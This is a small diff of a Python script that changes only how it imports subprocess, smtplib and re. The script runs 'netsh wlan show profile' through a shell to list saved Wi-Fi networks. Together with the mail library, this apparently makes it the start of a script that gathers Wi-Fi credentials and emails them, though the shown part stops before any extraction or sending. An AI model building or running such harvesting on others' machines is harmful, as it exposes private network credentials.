@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
-import subprocess, smtplib, re
+import subprocess
+import smtplib, re
 
 command1 = "netsh wlan show profile"
 networks = subprocess.check_output(command1,shell = True)
